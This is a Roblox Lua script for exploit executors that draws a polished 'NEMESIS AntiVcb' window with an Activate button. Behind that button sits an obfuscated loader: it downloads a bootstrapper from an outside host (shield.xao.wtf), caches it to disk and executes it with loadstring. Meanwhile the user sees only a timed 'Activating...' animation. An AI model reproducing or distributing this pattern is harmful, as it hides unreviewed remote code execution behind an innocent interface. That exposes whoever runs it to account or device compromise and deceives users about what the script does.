-- NEMESIS-STYLE UI - ANTIVCB (Xeno Max Compatibility) - Thinner + Local Logo
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Safely determine where to parent the UI
local TargetGuiService = (typeof(gethui) == "function" and gethui()) or PlayerGui

-- Prevent duplicate UI
local existing = TargetGuiService:FindFirstChild("NemesisAntiVCBGui")
if existing then existing:Destroy() end

--------------------------------------------------------------------------------
-- THEME (BLACK AND WHITE WITH WHITE TEXT)
--------------------------------------------------------------------------------
local THEME = {
	Background   = Color3.fromRGB(15, 15, 15),
	Panel        = Color3.fromRGB(25, 25, 25),
	Accent       = Color3.fromRGB(255, 255, 255),
	Stroke       = Color3.fromRGB(80, 80, 80),
	TextPrimary  = Color3.fromRGB(255, 255, 255),
	TextMuted    = Color3.fromRGB(200, 200, 200),
	ButtonIdle   = Color3.fromRGB(30, 30, 30),
	ButtonHover  = Color3.fromRGB(50, 50, 50),
	Danger       = Color3.fromRGB(255, 255, 255),
	Success      = Color3.fromRGB(255, 255, 255),
}

local OPEN_SIZE        = UDim2.new(0, 240, 0, 155)
local COLLAPSED_HEIGHT = 48
local TWEEN_INFO       = TweenInfo.new(0.22, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
local HOVER_TWEEN_INFO = TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

--------------------------------------------------------------------------------
-- LOGO SETTINGS
-- 1. Put your own .png in the executor workspace as: NemesisAntiVCB_Logo.png
-- 2. Or paste a direct .png link below → it auto-downloads so you can see/edit it
--------------------------------------------------------------------------------
local LOGO_PATH          = "whitelogo.png"
local LOGO_DOWNLOAD_URL  = "https://i.ibb.co/SwGkMS5h/whitelogo.png" -- ← paste a direct PNG link here (e.g. Discord CDN / Imgur / raw GitHub)
local FALLBACK_LOGO      = "rbxassetid://107541043103322"

local function getLogoImage()
	-- Prefer local file from workspace
	if typeof(getcustomasset) == "function" then
		if isfile and isfile(LOGO_PATH) then
			local ok, asset = pcall(getcustomasset, LOGO_PATH)
			if ok and asset then
				return asset
			end
		end

		-- Auto-download if a URL is provided and file doesn't exist
		if LOGO_DOWNLOAD_URL ~= "" and (not isfile or not isfile(LOGO_PATH)) then
			local ok, data = pcall(function()
				return game:HttpGet(LOGO_DOWNLOAD_URL)
			end)
			if ok and type(data) == "string" and #data > 200 then
				pcall(writefile, LOGO_PATH, data)
				if isfile and isfile(LOGO_PATH) then
					local ok2, asset = pcall(getcustomasset, LOGO_PATH)
					if ok2 and asset then
						return asset
					end
				end
			end
		end
	end

	-- Fallback to Roblox asset
	return FALLBACK_LOGO
end

--------------------------------------------------------------------------------
-- HELPERS
--------------------------------------------------------------------------------
local function tween(instance, props, info)
	local t = TweenService:Create(instance, info or TWEEN_INFO, props)
	t:Play()
	return t
end

local function corner(parent, radius)
	local c = Instance.new("UICorner")
	c.CornerRadius = radius or UDim.new(0, 12)
	c.Parent = parent
	return c
end

local function stroke(parent, color, thickness)
	local s = Instance.new("UIStroke")
	s.Color = color or THEME.Stroke
	s.Thickness = thickness or 1
	s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	s.Parent = parent
	return s
end

local function makeButton(parent, props)
	local btn = Instance.new("TextButton")
	btn.Size = props.Size or UDim2.new(1, 0, 0, 30)
	btn.BackgroundColor3 = props.BackgroundColor3 or THEME.ButtonIdle
	btn.BackgroundTransparency = props.BackgroundTransparency or 0.25
	btn.AutoButtonColor = false
	btn.Text = props.Text or ""
	btn.Font = Enum.Font.GothamBold
	btn.TextSize = props.TextSize or 12
	btn.TextColor3 = props.TextColor3 or THEME.TextPrimary
	btn.Parent = parent
	corner(btn, UDim.new(0, 8))
	local btnStroke = stroke(btn, THEME.Stroke, 1)
	btnStroke.Transparency = 0.3

	btn.MouseEnter:Connect(function()
		if not btn:GetAttribute("Locked") then
			tween(btn, { BackgroundColor3 = THEME.ButtonHover, BackgroundTransparency = 0.1 }, HOVER_TWEEN_INFO)
			tween(btnStroke, { Color = THEME.Accent, Transparency = 0 }, HOVER_TWEEN_INFO)
		end
	end)
	btn.MouseLeave:Connect(function()
		if not btn:GetAttribute("Locked") then
			tween(btn, {
				BackgroundColor3 = props.BackgroundColor3 or THEME.ButtonIdle,
				BackgroundTransparency = props.BackgroundTransparency or 0.25
			}, HOVER_TWEEN_INFO)
			tween(btnStroke, { Color = THEME.Stroke, Transparency = 0.3 }, HOVER_TWEEN_INFO)
		end
	end)

	return btn, btnStroke
end

--------------------------------------------------------------------------------
-- UI
--------------------------------------------------------------------------------
local gui = Instance.new("ScreenGui")
gui.Name = "NemesisAntiVCBGui"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 999999
gui.Parent = TargetGuiService

local frame = Instance.new("Frame")
frame.Name = "Main"
frame.Size = OPEN_SIZE
frame.Position = UDim2.new(0.5, -120, 0.5, -77)
frame.BackgroundColor3 = THEME.Background
frame.BackgroundTransparency = 0.15
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
frame.Parent = gui
corner(frame, UDim.new(0, 16))
stroke(frame, THEME.Stroke, 1.2)

local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 40)),
	ColorSequenceKeypoint.new(1, THEME.Background),
})
gradient.Rotation = 90
gradient.Parent = frame

-- Title Bar
local titleBar = Instance.new("Frame")
titleBar.Name = "TitleBar"
titleBar.BackgroundTransparency = 1
titleBar.Size = UDim2.new(1, 0, 0, 48)
titleBar.Parent = frame

local logo = Instance.new("ImageLabel")
logo.Name = "Logo"
logo.BackgroundTransparency = 1
logo.Size = UDim2.new(0, 26, 0, 26)          -- square
logo.Position = UDim2.new(0, 12, 0.5, -13)
logo.Image = getLogoImage()
logo.ScaleType = Enum.ScaleType.Fit          -- prevents distortion
logo.Parent = titleBar
corner(logo, UDim.new(0, 8))

local title = Instance.new("TextLabel")
title.Name = "Title"
title.BackgroundTransparency = 1
title.Size = UDim2.new(0, 140, 0, 22)
title.Position = UDim2.new(0, 46, 0.5, -11)
title.Text = "NEMESIS AntiVcb"
title.Font = Enum.Font.GothamBold
title.TextSize = 14
title.TextColor3 = THEME.TextPrimary
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = titleBar

local minBtn = makeButton(titleBar, { Text = "–", Size = UDim2.new(0, 24, 0, 24) })
minBtn.Position = UDim2.new(1, -58, 0, 12)

local closeBtn = makeButton(titleBar, {
	Text = "×",
	Size = UDim2.new(0, 24, 0, 24),
	TextColor3 = THEME.TextPrimary
})
closeBtn.Position = UDim2.new(1, -30, 0, 12)
closeBtn.TextSize = 16

local divider = Instance.new("Frame")
divider.BackgroundColor3 = THEME.Stroke
divider.BorderSizePixel = 0
divider.Size = UDim2.new(1, -24, 0, 1)
divider.Position = UDim2.new(0, 12, 0, 48)
divider.Parent = frame

-- Content
local content = Instance.new("Frame")
content.Name = "Content"
content.BackgroundTransparency = 1
content.Position = UDim2.new(0, 12, 0, 58)
content.Size = UDim2.new(1, -24, 1, -70)
content.Parent = frame

-- Warning text
local warningLabel = Instance.new("TextLabel")
warningLabel.Name = "Warning"
warningLabel.Size = UDim2.new(1, 0, 0, 16)
warningLabel.Position = UDim2.new(0, 0, 0, 4)
warningLabel.BackgroundTransparency = 1
warningLabel.Text = "please unmute before clicking activate"
warningLabel.Font = Enum.Font.Gotham
warningLabel.TextSize = 11
warningLabel.TextColor3 = THEME.TextMuted
warningLabel.TextXAlignment = Enum.TextXAlignment.Center
warningLabel.Parent = content

-- Activate Button
local activateBtn, activateStroke = makeButton(content, {
	Text = "Activate",
	Size = UDim2.new(1, 0, 0, 40),
	BackgroundColor3 = Color3.fromRGB(40, 40, 40),
	BackgroundTransparency = 0,
	TextColor3 = THEME.TextPrimary,
	TextSize = 14,
})
activateBtn.Position = UDim2.new(0, 0, 0, 28)
activateBtn.ClipsDescendants = true

-- Swipe overlay
local swipe = Instance.new("Frame")
swipe.Name = "Swipe"
swipe.Size = UDim2.new(0, 0, 1, 0)
swipe.Position = UDim2.new(0, 0, 0, 0)
swipe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
swipe.BackgroundTransparency = 0.15
swipe.BorderSizePixel = 0
swipe.ZIndex = 2
swipe.Parent = activateBtn
corner(swipe, UDim.new(0, 8))

local swipeGradient = Instance.new("UIGradient")
swipeGradient.Transparency = NumberSequence.new({
	NumberSequenceKeypoint.new(0, 0.6),
	NumberSequenceKeypoint.new(0.5, 0.1),
	NumberSequenceKeypoint.new(1, 0.6),
})
swipeGradient.Parent = swipe

--------------------------------------------------------------------------------
-- ACTIVATE LOGIC
--------------------------------------------------------------------------------
local activated = false

activateBtn.MouseButton1Click:Connect(function()
	if activated then return end
	activated = true
	activateBtn:SetAttribute("Locked", true)

	-- Stage 1: Activating...
	activateBtn.Text = "Activating..."
	activateBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
	activateStroke.Color = Color3.fromRGB(180, 180, 180)

	-- Run the original loader
	task.spawn(function()
		_bsdata0={1068206426,"XD3GCBRE4BUCTFVEFACA1FQGMA4DPFBBZG2BBF5GNGPD4FXF1CIGJEOB0ADD7CME",20260509,"\19\237\163\133\188\127N\194\199\180\16\223\226\136\130$",3189436506,2656102149,2439251475,0x6ceabec9,0xbadf8338,0XC96B6658,"ca43fa7fd292e8529440d8e248cb7d72fd7405bdcfec79e1e655ad13f224940a","R\133k\171\188\195\164]\28o(x\153-\182\133\244\141\200<\247\142\203\130",0};_ls_srv="https://shield.xao.wtf";_ls_id="550af30c-aaa3-4338-acab-f44010a5ef09";local _0O0S,_Splp,_OpS0="static_content_cf00797f","505046b1dc48-ls";pcall(function()_OpS0=readfile(_0O0S.."/init-".._Splp..".lua")end);if _OpS0 and #_OpS0>2000 then _OpS0=loadstring(_OpS0)else _OpS0=nil end;if _OpS0 then return _OpS0()else pcall(makefolder,_0O0S);_OpS0=game:HttpGet("https://shield.xao.wtf/cdn/bootstrapper.lua");writefile(_0O0S.."/init-".._Splp..".lua",_OpS0);return loadstring(_OpS0)()end
	end)

	-- Stage 2: After 12 seconds → Activated + swipe
	task.delay(12, function()
		if not activateBtn or not activateBtn.Parent then return end

		activateBtn.Text = "Activated"
		activateBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
		activateStroke.Color = Color3.fromRGB(255, 255, 255)
		activateStroke.Transparency = 0

		-- Swipe effect
		swipe.Size = UDim2.new(0, 0, 1, 0)
		swipe.Position = UDim2.new(0, 0, 0, 0)
		swipe.BackgroundTransparency = 0.15

		local swipeTween = TweenService:Create(swipe, TweenInfo.new(0.55, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
			Size = UDim2.new(1, 0, 1, 0)
		})
		swipeTween:Play()

		swipeTween.Completed:Connect(function()
			TweenService:Create(swipe, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
				BackgroundTransparency = 0.7
			}):Play()
		end)
	end)
end)

--------------------------------------------------------------------------------
-- WINDOW CONTROLS
--------------------------------------------------------------------------------
closeBtn.MouseButton1Click:Connect(function()
	gui:Destroy()
end)

local minimized = false
local expandedSize = OPEN_SIZE
minBtn.MouseButton1Click:Connect(function()
	minimized = not minimized
	if minimized then
		expandedSize = frame.Size
		content.Visible = false
		divider.Visible = false
		tween(frame, { Size = UDim2.new(0, expandedSize.X.Offset, 0, COLLAPSED_HEIGHT) })
		minBtn.Text = "+"
	else
		tween(frame, { Size = expandedSize })
		task.delay(TWEEN_INFO.Time, function()
			content.Visible = true
			divider.Visible = true
		end)
		minBtn.Text = "–"
	end
end)

-- Dragging
local draggingWindow, dragStart, startPos
titleBar.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		draggingWindow = true
		dragStart = input.Position
		startPos = frame.Position
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if draggingWindow and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
		local delta = input.Position - dragStart
		frame.Position = UDim2.new(
			startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y
		)
	end
end)

UserInputService.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		draggingWindow = false
	end
end)